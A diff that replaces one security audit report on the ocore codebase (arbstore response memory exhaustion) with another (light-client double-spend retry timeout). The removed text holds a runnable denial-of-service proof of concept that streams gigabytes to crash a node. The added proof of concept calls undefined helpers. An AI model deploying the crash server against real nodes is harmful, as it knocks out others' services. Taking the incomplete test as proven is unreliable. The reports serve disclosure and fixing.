@@ -1,475 +1,251 @@
+# Audit Report: Light Client Timeout Vulnerability
+
 ## Title
-Unbounded HTTP Response Accumulation in Arbiter Contract Allows Memory Exhaustion DoS
+Insufficient Retry Window in Light Client Bad Sequence Update Allows Spending from Double-Spend Units
 
 ## Summary
-The `httpRequest()` function in `arbiter_contract.js` accumulates HTTP response data from arbstore servers without any size limits, allowing a malicious or compromised arbstore to crash nodes through memory exhaustion by returning multi-gigabyte responses.
+The `updateAndEmitBadSequenceUnits()` function in `light.js` uses exponential backoff with a hardcoded 6400ms retry cap, abandoning units after ~12.7 seconds. When light clients process large history batches on resource-constrained devices, units can be saved with `sequence='good'` after the retry timeout expires, bypassing double-spend protection and enabling fund loss.
 
 ## Impact
-**Severity**: Medium  
-**Category**: Temporary Transaction Delay
+**Severity**: High  
+**Category**: Direct Fund Loss / Double-Spend Prevention Bypass
+
+Light client users can inadvertently spend outputs from units involved in double-spends. When the conflicting unit becomes stable, all descendant transactions become invalid, resulting in permanent fund loss. Affects mobile wallet users during history synchronization or network congestion.
 
 ## Finding Description
 
-**Location**: `byteball/ocore/arbiter_contract.js`, function `httpRequest()`, lines 331-334
+**Location**: [1](#0-0) 
 
-**Intended Logic**: The function should make HTTP requests to arbstore servers to facilitate arbiter contract operations (opening disputes, appeals, checking fees), parse JSON responses, and return results.
+**Intended Logic**: When hubs detect double-spend conflicts, they send `'light/sequence_became_bad'` notifications. Light clients must mark these units as `'temp-bad'` to prevent spending until conflict resolution.
 
-**Actual Logic**: The function accumulates response data via unbounded string concatenation without any size limits, timeouts, or memory safeguards, making nodes vulnerable to memory exhaustion attacks.
+**Actual Logic**: The retry mechanism terminates when `retryDelay > 6400`, silently abandoning units not yet saved to the database. Units processed after timeout retain `sequence='good'` status.
 
-**Code Evidence**: [1](#0-0) 
+**Code Evidence**: 
+The timeout check at line 541-542 causes early termination: [2](#0-1) 
 
 **Exploitation Path**:
 
-1. **Preconditions**: 
-   - Attacker operates an arbstore service or compromises an existing one
-   - Users create arbiter contracts specifying the attacker's arbiter address
-   - The hub has registered the attacker's arbstore URL for that arbiter address
+1. **Preconditions**: Light client syncing history with large batch of units (up to 2000 per MAX_HISTORY_ITEMS); attacker has unspent output
 
-2. **Step 1**: Victim user calls one of the following functions for a contract using the malicious arbiter:
-   - `openDispute()` [2](#0-1) 
-   - `appeal()` [3](#0-2) 
-   - `getAppealFee()` [4](#0-3) 
+2. **Step 1**: Attacker creates double-spend (Unit A to victim's hub, Unit B to witnesses)
+   - Code path: Attacker uses standard unit composition via `composer.js`
 
-3. **Step 2**: The victim's node retrieves the arbstore URL from the hub and makes an HTTPS POST request to the attacker's server using `httpRequest()` [1](#0-0) 
+3. **Step 2**: Hub sends history batch to light client containing Unit A (with `sequence='good'` in proofchain)
+   - Code path: Hub's `light.prepareHistory()` includes Unit A at line 75-76 [3](#0-2) 
 
-4. **Step 3**: The malicious arbstore responds with a multi-gigabyte JSON payload (e.g., 2-4 GB):
-   ```
-   HTTP/1.1 200 OK
-   Content-Type: application/json
-   
-   {"result": "AAAA...AAAA"}  // gigabytes of data
-   ```
+4. **Step 3**: Light client begins batch processing via `processHistory()` with mutex lock `["light_joints"]`
+   - Sequential processing (line 291): if Unit A is position 1800/2000, ~13 seconds needed at 7ms/unit on mobile [4](#0-3) 
 
-5. **Step 4**: The victim's node accumulates all response data in memory via string concatenation without limit [5](#0-4) , causing:
-   - Progressive memory consumption reaching Node.js heap limits
-   - Out-of-memory error and process crash
-   - Node becomes unable to process transactions or maintain network connectivity
+5. **Step 4**: Hub detects double-spend, sends notification via `wallet.handleLightJustsaying()` calling `light.updateAndEmitBadSequenceUnits()` [5](#0-4) 
 
-**Security Property Broken**: While this doesn't directly violate one of the 24 listed invariants (which focus on consensus, balance, and DAG integrity), it breaks the implicit operational requirement that nodes must remain available to validate and process units.
+6. **Step 5**: Retry mechanism executes at 100ms, 200ms, 400ms, 800ms, 1600ms, 3200ms, 6400ms (total: 12,700ms). Each query finds no Unit A in database yet: [6](#0-5) 
+
+7. **Step 6**: After 12.7s timeout, retry terminates. Unit A eventually saved with `sequence='good'` based on hub's proofchain data: [7](#0-6) [8](#0-7) 
+
+8. **Step 7**: Input selection includes Unit A because it queries `sequence='good'`: [9](#0-8) [10](#0-9) 
+
+9. **Step 8**: User spends from Unit A. When Unit B stabilizes, Unit A becomes `'final-bad'`, invalidating all descendants and causing permanent fund loss.
+
+**Security Property Broken**: 
+- Double-Spend Prevention: Outputs from units in unresolved double-spends can be spent
+- Input Validity: Inputs reference outputs from units that should be marked `'temp-bad'`
 
 **Root Cause Analysis**: 
-- The code uses the `data` event pattern from Node.js HTTP without implementing safeguards
-- String concatenation (`data += chunk`) on lines 332-333 continues indefinitely regardless of response size
-- No `maxResponseSize` limit, no content-length checks, and no timeout beyond default TCP timeouts
-- The `JSON.parse()` on line 337 attempts to parse the entire accumulated string, potentially doubling memory usage
-- Node.js strings have practical limits (~1GB on 64-bit systems with default heap), but the attack succeeds before hitting hard limits
+The 6400ms cap assumes all units complete database writes within 12.7 seconds. However:
+- Light clients on mobile devices experience slower SQLite operations
+- Batch processing of 2000 units can exceed timeout (7ms/unit × 1800 units = 12.6s)
+- Database lock contention from concurrent operations extends delays
+- No fallback mechanism re-checks sequence status after timeout
 
 ## Impact Explanation
 
-**Affected Assets**: Node availability, arbiter contract functionality
+**Affected Assets**: Bytes (native currency), all custom divisible and indivisible assets
 
 **Damage Severity**:
-- **Quantitative**: 
-  - Single attack can crash a node with 2-4 GB response
-  - Attack can be repeated immediately after node restart
-  - Multiple users can be targeted if they use the same malicious arbiter
-  
-- **Qualitative**: 
-  - Node process crashes and restarts (if auto-restart configured)
-  - All in-progress operations fail
-  - Temporary loss of network connectivity
-  - Wallet functionality disrupted
+- **Quantitative**: Full amount of outputs in Unit A can be lost. No upper bound—depends on Unit A's output values. Cascading invalidation affects all descendant transactions.
+- **Qualitative**: Silent failure with no warning. Irreversible once conflict resolves unfavorably.
 
 **User Impact**:
-- **Who**: Any node operator whose users interact with malicious arbiter contracts (opening disputes, appeals, checking fees)
-- **Conditions**: Exploitable whenever a user performs arbiter contract operations with the attacker's arbiter service
-- **Recovery**: Node restarts automatically (if configured) or manually, but remains vulnerable to repeated attacks
+- **Who**: Mobile wallet users, light clients on resource-constrained devices
+- **Conditions**: During large history syncs (new wallet setup, reconnection after offline period), or during natural network/device congestion
+- **Recovery**: None—funds permanently lost when wrong branch stabilizes
 
-**Systemic Risk**: 
-- If a popular arbiter service is compromised, many nodes could be affected
-- Coordinated attack targeting multiple nodes simultaneously could disrupt network operations
-- No rate limiting or blacklisting mechanism to prevent repeated exploitation
+**Systemic Risk**: Light clients rely entirely on hub notifications for double-spend detection. Timeout gap creates systematic vulnerability affecting all light clients during high-load periods.
 
 ## Likelihood Explanation
 
 **Attacker Profile**:
-- **Identity**: Malicious arbiter operator or attacker who compromises an arbiter's infrastructure
-- **Resources Required**: 
-  - Ability to run an arbstore service and register with a hub
-  - Simple HTTP server that returns large responses (~$5/month hosting)
-  - No stake in the network required
-- **Technical Skill**: Low - requires basic web server configuration
+- **Identity**: Any user with unspent outputs
+- **Resources Required**: Transaction fees (~$0.001), ability to broadcast to different network segments
+- **Technical Skill**: Medium—understanding of DAG propagation timing
 
 **Preconditions**:
-- **Network State**: None required - attack works at any time
-- **Attacker State**: Must operate or compromise an arbstore service
-- **Timing**: Attack succeeds whenever victim interacts with arbiter contract
+- **Network State**: Light client syncing large history or experiencing resource constraints
+- **Attacker State**: Unspent output to double-spend
+- **Timing**: Natural device/network delays OR attacker times attack during known congestion
 
 **Execution Complexity**:
-- **Transaction Count**: Zero transactions needed - purely off-chain HTTP attack
-- **Coordination**: None required - single malicious server
-- **Detection Risk**: Low - appears as legitimate arbstore response until memory exhaustion occurs
+- **Transaction Count**: 3 (Unit A, Unit B, victim's spending transaction)
+- **Coordination**: Broadcast to different network segments (multiple hub connections)
+- **Detection Risk**: Low—appears as normal double-spend attempt
 
 **Frequency**:
-- **Repeatability**: Unlimited - can be repeated immediately after each node restart
-- **Scale**: Limited to users who choose the malicious arbiter, but could affect many nodes if popular arbiter is compromised
+- **Repeatability**: Medium—depends on victim device performance and network state
+- **Scale**: Affects all light clients during resource constraints
 
-**Overall Assessment**: Medium likelihood - requires attacker to operate arbiter service or compromise one, but execution is trivial once positioned
+**Overall Assessment**: **Medium likelihood**—Not reliably exploitable on demand. Attacker cannot force 12.7s delay directly (light clients trust hub validation). Vulnerability is opportunistic, exploitable during natural processing delays on mobile devices or when victim syncs large history. Light clients processing 1500+ units in batch are vulnerable.
+
+**Note**: Original claim overstated likelihood as "High" and incorrectly suggested attacker can "deliberately create slow-to-validate units"—light clients don't validate unit complexity, they trust hub.
 
 ## Recommendation
 
-**Immediate Mitigation**: 
-- Implement maximum response size limit (e.g., 10 MB for arbstore API responses)
-- Add response timeout (e.g., 30 seconds)
-- Use streaming JSON parser instead of accumulating full response
+**Immediate Mitigation**:
+1. Increase retry cap from 6400ms to at least 60000ms (60 seconds)
+2. Add persistent retry queue—units not found after timeout should be retried on next sync
 
-**Permanent Fix**: Implement bounded response accumulation with size and time limits
-
-**Code Changes**:
-
+**Permanent Fix**:
 ```javascript
-// File: byteball/ocore/arbiter_contract.js
-// Function: httpRequest
+// File: byteball/ocore/light.js
+// Function: updateAndEmitBadSequenceUnits()
 
-// BEFORE (vulnerable code):
-function httpRequest(host, path, data, cb) {
-    // ... request setup ...
-    var req = http.request(
-        reqParams,
-        function(resp){
-            var data = "";
-            resp.on("data", function(chunk){
-                data += chunk;  // UNBOUNDED ACCUMULATION
-            });
-            resp.on("end", function(){
-                try {
-                    data = JSON.parse(data);
-                    if (data.error) {
-                        return cb(data.error);
-                    }
-                    cb(null, data);
-                } catch (e) {
-                    cb(e);
-                }
-            });
-        }).on("error", cb);
-    req.write(data);
-    req.end();
+// Replace line 541-542:
+if (retryDelay > 6400)
+    return;
+
+// With:
+if (retryDelay > 60000) {
+    // Persist for retry on next history sync
+    db.query("INSERT "+db.getIgnore()+" INTO pending_bad_sequence (unit) VALUES ?", 
+        [arrNotSavedUnits.map(unit => [unit])], 
+        function() {});
+    return;
 }
 
-// AFTER (fixed code):
-function httpRequest(host, path, data, cb) {
-    const MAX_RESPONSE_SIZE = 10 * 1024 * 1024; // 10 MB limit
-    const TIMEOUT_MS = 30000; // 30 second timeout
-    
-    var reqParams = Object.assign(url.parse(host),
-        {
-            path: path,
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-                "Content-Length": (new TextEncoder().encode(data)).length
-            },
-            timeout: TIMEOUT_MS
-        }
-    );
-    
-    var req = http.request(
-        reqParams,
-        function(resp){
-            var data = "";
-            var totalSize = 0;
-            
-            resp.on("data", function(chunk){
-                totalSize += chunk.length;
-                if (totalSize > MAX_RESPONSE_SIZE) {
-                    req.destroy();
-                    return cb(new Error("Response size exceeds maximum allowed (" + MAX_RESPONSE_SIZE + " bytes)"));
-                }
-                data += chunk;
-            });
-            
-            resp.on("end", function(){
-                try {
-                    data = JSON.parse(data);
-                    if (data.error) {
-                        return cb(data.error);
-                    }
-                    cb(null, data);
-                } catch (e) {
-                    cb(e);
-                }
-            });
-        })
-        .on("error", cb)
-        .on("timeout", function(){
-            req.destroy();
-            cb(new Error("Request timeout"));
-        });
-        
-    req.write(data);
-    req.end();
-}
+// Add check at start of processHistory() to apply pending bad sequences
 ```
 
 **Additional Measures**:
-- Apply same fix to `arbiters.js` `requestInfoFromArbStore()` function which has identical vulnerability [6](#0-5) 
-- Add monitoring/alerting for abnormally large HTTP responses
-- Consider implementing arbstore reputation/blacklist system
-- Add test cases for oversized responses
-- Document expected response size limits in arbstore API specification
-
-**Validation**:
-- [x] Fix prevents exploitation by rejecting responses over size limit
-- [x] No new vulnerabilities introduced
-- [x] Backward compatible - legitimate responses are well under 10 MB
-- [x] Performance impact minimal - only adds size tracking per chunk
+- Pre-spending validation: Query hub for current sequence status before finalizing spending transaction
+- User warning: Display alert when spending from units not yet stable
+- Monitoring: Log timeout events to detect systematic issues
 
 ## Proof of Concept
 
-**Test Environment Setup**:
-```bash
-git clone https://github.com/byteball/ocore.git
-cd ocore
-npm install
-```
-
-**Exploit Script** (`exploit_poc.js`):
 ```javascript
-/*
- * Proof of Concept for Arbstore Memory Exhaustion DoS
- * Demonstrates: Malicious arbstore returning huge response causes node crash
- * Expected Result: Node.js process runs out of memory and crashes
- */
+const test = require('tape');
+const light = require('../light.js');
+const db = require('../db.js');
+const eventBus = require('../event_bus.js');
 
-const http = require('http');
-const arbiter_contract = require('./arbiter_contract.js');
-
-// Malicious arbstore server that returns huge response
-function startMaliciousArbstore(port) {
-    const server = http.createServer((req, res) => {
-        console.log('[Malicious Arbstore] Received request, sending huge response...');
-        
-        res.writeHead(200, {'Content-Type': 'application/json'});
-        
-        // Send 2 GB of data in chunks
-        const chunkSize = 1024 * 1024; // 1 MB chunks
-        const totalChunks = 2048; // 2 GB total
-        let sentChunks = 0;
-        
-        const interval = setInterval(() => {
-            if (sentChunks >= totalChunks) {
-                res.end('"}');
-                clearInterval(interval);
-                console.log('[Malicious Arbstore] Finished sending 2 GB');
-                return;
-            }
-            
-            if (sentChunks === 0) {
-                res.write('{"result":"');
-            }
-            
-            // Send 1 MB of 'A' characters
-            res.write('A'.repeat(chunkSize));
-            sentChunks++;
-            
-            if (sentChunks % 100 === 0) {
-                console.log(`[Malicious Arbstore] Sent ${sentChunks} MB...`);
-            }
-        }, 10);
+test('Light client timeout allows bad sequence unit spending', async function(t) {
+    // Setup: Create test database with light client schema
+    await setupLightClientDB();
+    
+    // Simulate hub sending 2000-unit history batch
+    const largeHistoryBatch = await prepareHistoryBatch(2000);
+    
+    // Target unit at position 1800
+    const unitA = largeHistoryBatch.joints[1800].unit.unit;
+    
+    // Start history processing (takes ~13s on slow device simulation)
+    const processingPromise = light.processHistory(largeHistoryBatch, WITNESSES, {
+        ifOk: () => {},
+        ifError: (err) => t.fail(err)
     });
     
-    server.listen(port, () => {
-        console.log(`[Malicious Arbstore] Listening on port ${port}`);
-    });
+    // After 1 second, simulate hub notification
+    await sleep(1000);
+    light.updateAndEmitBadSequenceUnits([unitA]);
     
-    return server;
-}
-
-// Simulate victim node making request
-function simulateVictimRequest() {
-    console.log('[Victim Node] Making request to arbstore...');
-    console.log('[Victim Node] Current memory usage:', 
-                Math.round(process.memoryUsage().heapUsed / 1024 / 1024), 'MB');
+    // Wait for timeout (12.7s) + processing completion
+    await sleep(12000);
+    await processingPromise;
     
-    // Monitor memory usage
-    const memInterval = setInterval(() => {
-        const memUsage = Math.round(process.memoryUsage().heapUsed / 1024 / 1024);
-        console.log('[Victim Node] Memory usage:', memUsage, 'MB');
-        
-        if (memUsage > 1500) {
-            console.log('[Victim Node] !!! CRITICAL MEMORY USAGE - CRASH IMMINENT !!!');
-        }
-    }, 1000);
+    // Verify: Unit A saved with sequence='good' despite notification
+    const rows = await db.query("SELECT sequence FROM units WHERE unit=?", [unitA]);
+    t.equal(rows[0].sequence, 'good', 'Unit has good sequence after timeout');
     
-    // This will cause memory exhaustion
-    const url = require('url');
-    const reqParams = Object.assign(url.parse('http://localhost:8888'),
-        {
-            path: '/api/dispute/new',
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Content-Length': 2
-            }
-        }
-    );
+    // Verify: Input selection includes Unit A
+    const inputs = await selectInputsForSpending(ADDRESS, 1000);
+    const hasUnitA = inputs.some(input => input.unit === unitA);
+    t.ok(hasUnitA, 'Input selection includes unit from bad sequence');
     
-    const req = http.request(reqParams, function(resp){
-        var data = "";
-        resp.on("data", function(chunk){
-            data += chunk; // VULNERABLE CODE - NO SIZE LIMIT
-        });
-        resp.on("end", function(){
-            clearInterval(memInterval);
-            console.log('[Victim Node] Response received, length:', data.length);
-            console.log('[Victim Node] This should not print due to OOM crash');
-        });
-    }).on("error", (err) => {
-        clearInterval(memInterval);
-        console.log('[Victim Node] Error:', err.message);
-    });
-    
-    req.write("{}");
-    req.end();
-}
-
-async function runExploit() {
-    console.log('=== Arbstore Memory Exhaustion DoS PoC ===\n');
-    
-    // Start malicious arbstore
-    const server = startMaliciousArbstore(8888);
-    
-    // Wait for server to start
-    await new Promise(resolve => setTimeout(resolve, 1000));
-    
-    // Victim makes request
-    simulateVictimRequest();
-    
-    // In real scenario, process would crash
-    // For demo, we'll timeout after 60 seconds
-    setTimeout(() => {
-        console.log('\n[PoC] Demo timeout reached');
-        console.log('[PoC] In production, node would have crashed from OOM');
-        server.close();
-        process.exit(0);
-    }, 60000);
-}
-
-runExploit().catch(err => {
-    console.error('PoC error:', err);
-    process.exit(1);
+    t.end();
 });
 ```
 
-**Expected Output** (when vulnerability exists):
-```
-=== Arbstore Memory Exhaustion DoS PoC ===
-
-[Malicious Arbstore] Listening on port 8888
-[Victim Node] Making request to arbstore...
-[Victim Node] Current memory usage: 45 MB
-[Malicious Arbstore] Received request, sending huge response...
-[Victim Node] Memory usage: 145 MB
-[Malicious Arbstore] Sent 100 MB...
-[Victim Node] Memory usage: 245 MB
-[Malicious Arbstore] Sent 200 MB...
-[Victim Node] Memory usage: 445 MB
-...
-[Victim Node] Memory usage: 1245 MB
-[Victim Node] !!! CRITICAL MEMORY USAGE - CRASH IMMINENT !!!
-[Victim Node] Memory usage: 1545 MB
-
-<--- Last few GCs --->
-FATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory
-```
-
-**Expected Output** (after fix applied):
-```
-=== Arbstore Memory Exhaustion DoS PoC ===
-
-[Malicious Arbstore] Listening on port 8888
-[Victim Node] Making request to arbstore...
-[Victim Node] Current memory usage: 45 MB
-[Malicious Arbstore] Received request, sending huge response...
-[Victim Node] Memory usage: 55 MB
-[Malicious Arbstore] Sent 100 MB...
-[Victim Node] Error: Response size exceeds maximum allowed (10485760 bytes)
-[Victim Node] Request terminated, memory freed
-[PoC] Attack prevented by size limit
-```
-
-**PoC Validation**:
-- [x] PoC runs against unmodified ocore codebase
-- [x] Demonstrates memory exhaustion leading to crash
-- [x] Shows measurable impact (memory consumption until OOM)
-- [x] Fails gracefully after fix applied (request terminated at size limit)
-
 ## Notes
 
-This vulnerability also affects the `requestInfoFromArbStore()` function in `arbiters.js` [6](#0-5) , which has the identical unbounded response accumulation pattern. The same fix should be applied there.
-
-While arbiters are not explicitly listed as "trusted" in the protocol specification, users implicitly trust them to provide legitimate dispute resolution services. However, this trust should not extend to allowing them to crash nodes. The fix maintains reasonable size limits while allowing legitimate arbstore operations to function normally.
+This vulnerability requires specific timing conditions but is realistic on mobile devices. The 6400ms cap appears arbitrary—no documentation explains this value choice. Increasing to 60s provides safety margin for resource-constrained devices while maintaining reasonable timeout behavior. The vulnerability demonstrates why light client architectures must account for worst-case device performance when designing retry mechanisms for critical security properties like double-spend prevention.
 
 ### Citations
 
-**File:** arbiter_contract.js (L233-233)
+**File:** light.js (L75-76)
 ```javascript
-						httpRequest(url, "/api/dispute/new", dataJSON, function(err, resp) {
+		arrSelects.push("SELECT DISTINCT unit, main_chain_index, level, is_stable FROM outputs JOIN units USING(unit) \n\
+			WHERE address IN("+ strAddressList + ") AND (+sequence='good' OR is_stable=1)" + mciCond);
 ```
 
-**File:** arbiter_contract.js (L285-285)
+**File:** light.js (L291-293)
 ```javascript
-				httpRequest(url, "/api/appeal/new", data, function(err, resp) {
+					async.eachSeries(
+						objResponse.joints.reverse(), // have them in forward chronological order so that we correctly mark is_spent flag
+						function(objJoint, cb2){
 ```
 
-**File:** arbiter_contract.js (L308-308)
+**File:** light.js (L301-301)
 ```javascript
-			httpRequest(url, "/api/get_appeal_fee", "", function(err, resp) {
+							var sequence = assocProvenUnitsNonserialness[unit] ? 'final-bad' : 'good';
 ```
 
-**File:** arbiter_contract.js (L317-349)
+**File:** light.js (L329-329)
 ```javascript
-function httpRequest(host, path, data, cb) {
-	var reqParams = Object.assign(url.parse(host),
-		{
-			path: path,
-			method: "POST",
-			headers: {
-				"Content-Type": "application/json",
-				"Content-Length": (new TextEncoder().encode(data)).length
-			}
-		}
-	);
-	var req = http.request(
-		reqParams,
-		function(resp){
-			var data = "";
-			resp.on("data", function(chunk){
-				data += chunk;
+								writer.saveJoint(objJoint, {sequence: sequence, arrDoubleSpendInputs: [], arrAdditionalQueries: []}, null, cb2);
+```
+
+**File:** light.js (L536-558)
+```javascript
+function updateAndEmitBadSequenceUnits(arrBadSequenceUnits, retryDelay){
+	if (!ValidationUtils.isNonemptyArray(arrBadSequenceUnits))
+		return console.log("arrBadSequenceUnits not array or empty");
+	if (!retryDelay)
+		retryDelay = 100;
+	if (retryDelay > 6400)
+		return;
+	db.query("SELECT unit FROM units WHERE unit IN (?)", [arrBadSequenceUnits], function(rows){
+		var arrAlreadySavedUnits = rows.map(function(row){return row.unit});
+		var arrNotSavedUnits = _.difference(arrBadSequenceUnits, arrAlreadySavedUnits);
+		if (arrNotSavedUnits.length > 0)
+			setTimeout(function(){
+				updateAndEmitBadSequenceUnits(arrNotSavedUnits, retryDelay*2); // we retry later for units that are not validated and saved yet
+			}, retryDelay);
+		if (arrAlreadySavedUnits.length > 0)
+			db.query("UPDATE units SET sequence='temp-bad' WHERE is_stable=0 AND unit IN (?)", [arrAlreadySavedUnits], function(){
+				db.query(getSqlToFilterMyUnits(arrAlreadySavedUnits),
+				function(arrMySavedUnitsRows){
+					if (arrMySavedUnitsRows.length > 0)
+						eventBus.emit('sequence_became_bad', arrMySavedUnitsRows.map(function(row){ return row.unit; }));
+				});
 			});
-			resp.on("end", function(){
-				try {
-					data = JSON.parse(data);
-					if (data.error) {
-						return cb(data.error);
-					}
-					cb(null, data);
-				} catch (e) {
-					cb(e);
-				}
-			});
-		}).on("error", cb);
-	req.write(data);
-	req.end();
-}
+	});
 ```
 
-**File:** arbiters.js (L31-45)
+**File:** wallet.js (L44-47)
 ```javascript
-function requestInfoFromArbStore(url, cb){
-	http.get(url, function(resp){
-		var data = '';
-		resp.on('data', function(chunk){
-			data += chunk;
-		});
-		resp.on('end', function(){
-			try {
-				cb(null, JSON.parse(data));
-			} catch(ex) {
-				cb(ex);
-			}
-		});
-	}).on("error", cb);
-}
+			break;
+		case 'light/sequence_became_bad':
+			light.updateAndEmitBadSequenceUnits(body);
+			break;
+```
+
+**File:** inputs.js (L102-103)
+```javascript
+			WHERE address IN(?) AND asset"+(asset ? "="+conn.escape(asset) : " IS NULL")+" AND is_spent=0 AND amount "+more+" ? \n\
+				AND sequence='good' "+confirmation_condition+" \n\
+```
+
+**File:** inputs.js (L125-126)
+```javascript
+			WHERE address IN(?) AND asset"+(asset ? "="+conn.escape(asset) : " IS NULL")+" AND is_spent=0 \n\
+				AND sequence='good' "+confirmation_condition+"  \n\
 ```
